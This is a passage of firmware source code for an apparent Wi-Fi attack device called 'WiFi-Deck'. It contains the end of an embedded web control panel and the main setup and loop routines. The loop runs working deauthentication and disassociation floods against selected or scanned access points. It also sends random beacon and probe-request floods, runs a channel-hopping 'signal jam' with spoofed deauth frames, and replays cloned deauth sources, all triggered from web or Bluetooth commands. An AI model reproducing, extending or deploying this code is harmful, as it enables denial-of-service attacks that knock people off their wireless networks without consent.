function toast(msg){let t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
async function fetchJSON(url,opts={}){try{let r=await fetch(url,opts);return await r.json();}catch(e){toast('Network error');return null;}}
async function doScan(){document.getElementById('scanLoading').classList.add('show');document.getElementById('netList').innerHTML='';selectedIndices.clear();await fetchJSON(API+'/scan',{method:'POST'});scanCache=await fetchJSON(API+'/scan');if(scanCache){toast('扫描完成: '+scanCache.count+' 个网络');renderNetworksData(scanCache);}document.getElementById('scanLoading').classList.remove('show');}
function renderNetworks(){if(scanCache){renderNetworksData(scanCache);}else{fetchJSON(API+'/scan').then(d=>{if(d){scanCache=d;renderNetworksData(d);}});}}
function renderNetworksData(data){let html='';data.networks.forEach(n=>{let pct=Math.max(0,Math.min(100,n.rssi+120));let cls=pct>60?'good':(pct>35?'mid':'bad');let bandCls=n.channel>=36?'band5':'band24';let bandTxt=n.channel>=36?'5G':'2.4G';let sel=selectedIndices.has(n.index)?'selected':'';html+=`<div class="net-item ${sel}" onclick="toggleNet(${n.index})"><div class="net-info"><div class="net-ssid">${escHtml(n.ssid||'(隐藏)')}</div><div class="net-meta">CH:${n.channel} BSSID:${n.bssid} RSSI:${n.rssi}dBm <span class="net-band ${bandCls}">${bandTxt}</span></div><div class="bar"><div class="bar-fill ${cls}" style="width:${pct}%"></div></div></div><div class="net-check"></div></div>`;});if(!html)html='<p style="text-align:center;color:#666;padding:20px">暂无扫描结果，请先扫描</p>';document.getElementById('netList').innerHTML=html;}
function toggleNet(idx){if(selectedIndices.has(idx))selectedIndices.delete(idx);else selectedIndices.add(idx);renderNetworksData(scanCache||{networks:[]});updateAttackStats();}
async function setTargets(){let indices=Array.from(selectedIndices).join(',');let data=await fetchJSON(API+'/target?indices='+indices,{method:'POST'});if(data){toast('已设置 '+data.targets+' 个目标');return true;}return false;}function startAttack(cmd){setTargets().then(()=>sendCmd(cmd));}function singleApAttack(){if(selectedIndices.size===0){toast('请先在扫描页选择一个目标');return;}let firstIdx=Array.from(selectedIndices)[0];sendCmd('single_ap '+firstIdx);}function escHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
async function sendCmd(cmd){let data=await fetchJSON(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)});if(data)toast('已执行: '+cmd);}
async function timedAttack(){let ms=prompt('攻击持续时间(ms):','10000');if(ms&&parseInt(ms)>0){await setTargets();sendCmd('attack_time '+ms);}}
async function updateAttackStats(){document.getElementById('statTargets').textContent=selectedIndices.size;let data=await fetchJSON(API+'/status');if(data){document.getElementById('statNets').textContent=data.scan_count;let dot=document.getElementById('statusDot');dot.className='status-dot';if(data.attack_enabled||data.disassoc_enabled||data.beacon_flood||data.probe_flood||data.signal_jam||data.deauth_sniff)dot.classList.add('attacking');else if(data.sniffing)dot.classList.add('active');let s=Math.floor(data.uptime/1000);let m=Math.floor(s/60);let h=Math.floor(m/60);document.getElementById('cfgUptime').textContent=h+'h '+(m%60)+'m';}}
async function saveConfig(){let body='cycle_delay='+document.getElementById('cfgCycleDelay').value;body+='&scan_time='+document.getElementById('cfgScanTime').value;body+='&num_frames='+document.getElementById('cfgNumFrames').value;body+='&start_channel='+document.getElementById('cfgStartChannel').value;body+='&scan_cycles='+document.getElementById('cfgScanCycles').value;body+='&led='+document.getElementById('cfgLed').value;let data=await fetchJSON(API+'/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});if(data)toast('配置已保存');}
async function initStatus(){let data=await fetchJSON(API+'/info');if(data){document.getElementById('cfgCycleDelay').value=data.cycle_delay;document.getElementById('cfgScanTime').value=data.scan_time;document.getElementById('cfgNumFrames').value=data.num_frames;document.getElementById('cfgStartChannel').value=data.start_channel;document.getElementById('cfgScanCycles').value=data.scan_between_cycles?'on':'off';document.getElementById('cfgLed').value=data.led?'on':'off';}}
window.onload=()=>{renderNetworks();initStatus();setInterval(()=>{if(document.getElementById('page-attack').classList.contains('active'))updateAttackStats();},3000);};
</script>
</body>
</html>)=====";

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);

  if (USE_LED) {
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);
    digitalWrite(LED_R, HIGH); delay(100); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
  }

  Serial.println("=== WiFi-Deck ===");
  Serial.println("[INFO] Starting WiFi AP (non-hidden)...");

  // Start AP in non-hidden mode so phones can discover it
  startSoftAP();

  Serial.println("[INFO] AP started: " WIFI_SSID);
  Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
  Serial.println("[INFO] Web server started on port 80");

  // Start BLE UART service for the Android App
  setupBLE();

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  // Handle commands from Serial
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    handleCommand(command);
  }

  // Handle commands queued from the BLE task (ring buffer)
  while (cmdTail != cmdHead) {
    String cmd = String(cmdRing[cmdTail]);
    cmdTail = (cmdTail + 1) % CMD_RING_SIZE;
    handleCommand(cmd);
  }

  // Handle web clients
  handleWebClient();

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles
  if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled) {
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks() == 0) {
          printScanResults();
        }
      }
      if (target_mode) {
        targetAttack();
      }
      else {
        generalAttack();
      }
    }
    last_cycle = millis();
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK
  //===============================
  if (disassoc_enabled && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    const std::vector<WiFiScanResult> &aps_to_attack =
      (target_mode && !target_aps.empty()) ? target_aps : scan_results;

    if (!aps_to_attack.empty()) {
      if (USE_LED) digitalWrite(LED_B, HIGH);
      for (size_t i = 0; i < aps_to_attack.size(); i++) {
        if (wifi_set_channel(aps_to_attack[i].channel) != 0) {
          Serial.print("[WARN] wifi_set_channel(");
          Serial.print(aps_to_attack[i].channel);
          Serial.println(") failed");
          continue;
        }
        for (unsigned long j = 0; j < num_send_frames; j++) {
          uint16_t reason = disassoc_reasons[j % num_disassoc_reasons];
          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);                    // broadcast
          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, aps_to_attack[i].bssid, reason);     // directed to AP
          delay(1);
        }
      }
      // Return to the AP's own channel so the phone keeps its connection.
      wifi_set_channel(WIFI_CHANNEL);
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[DISASSOC] Attack cycle completed.");
    }
  }

  //===============================
  // BEACON FLOOD
  //===============================
  if (beacon_flood_enabled && (millis() - last_beacon_flood >= beacon_flood_delay)) {
    last_beacon_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(8, 17);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_beacon_frame(fakeSSID, ssidLen, currentChannel);
    beacon_flood_count++;
    if (beacon_flood_count % 20 == 0) {
      Serial.print("[BCN FLOOD] ");
      Serial.print(beacon_flood_count);
      Serial.println(" beacons sent");
    }
  }

  //===============================
  // PROBE FLOOD
  //===============================
  if (probe_flood_enabled && (millis() - last_probe_flood >= probe_flood_delay)) {
    last_probe_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(4, 13);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_probe_req_frame(fakeSSID, ssidLen);
    probe_flood_count++;
    if (probe_flood_count % 50 == 0) {
      Serial.print("[PRB FLOOD] ");
      Serial.print(probe_flood_count);
      Serial.println(" probes sent");
    }
  }

  //===============================
  // SIGNAL JAM (rapid channel cycling + deauth)
  //===============================
  if (signal_jam_enabled && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
    last_signal_jam = millis();
    int totalChs = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;
    currentChannel = CHANNELS_2GHZ[signal_jam_ch_index];
    wifi_set_channel(currentChannel);
    for (int j = 0; j < 3; j++) {
      uint8_t fakeBSSID[6];
      randomMAC(fakeBSSID);
      wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
    }
    signal_jam_count++;
    if (USE_LED) { digitalWrite(LED_B, !digitalRead(LED_B)); }
    if (signal_jam_count % 50 == 0) {
      Serial.print("[SIG JAM] ");
      Serial.print(signal_jam_count);
      Serial.print(" cycles, ch=");
      Serial.println(currentChannel);
    }
  }

  //===============================
  // DEAUTH SNIFF-AND-CLONE
  //===============================
  if (deauth_sniff_enabled && has_sniffed_deauth && (millis() - last_deauth_sniff_attack >= deauth_sniff_interval)) {
    last_deauth_sniff_attack = millis();
    // Briefly leave promisc to TX from the cloned source MAC, then resume
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    for (unsigned long j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(sniffed_deauth_src, dst_mac, deauth_reasons[j % num_deauth_reasons]);
      wifi_tx_deauth_frame(sniffed_deauth_src, sniffed_deauth_src, disassoc_reasons[j % num_disassoc_reasons]);
      delay(1);
    }
    has_sniffed_deauth = false;
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    isSniffing = true;
  }

  // Handle channel hopping if enabled
  if (isSniffing) {
    hopChannel();
  }

  // Push sniff logs to BLE (throttled to one line per ~25ms)
  static unsigned long lastLogPush = 0;
  if (logTail != logHead && (millis() - lastLogPush >= 25)) {
    lastLogPush = millis();
    String escapedMsg = jsonEscape(String(sniffLogRing[logTail]));
    if (escapedMsg.length() > 190) {
      escapedMsg = escapedMsg.substring(0, 190) + "...";
    }
    String logLine = String("{\"t\":\"log\",\"m\":\"") + escapedMsg + "\"}";
    bleSendLine(logLine);
    logTail = (logTail + 1) % LOG_RING_SIZE;
  }

  // Push status heartbeat every 1s
  static unsigned long lastStatusPush = 0;
  if (millis() - lastStatusPush >= 1000) {
    lastStatusPush = millis();
    blePushStatus();
  }
}
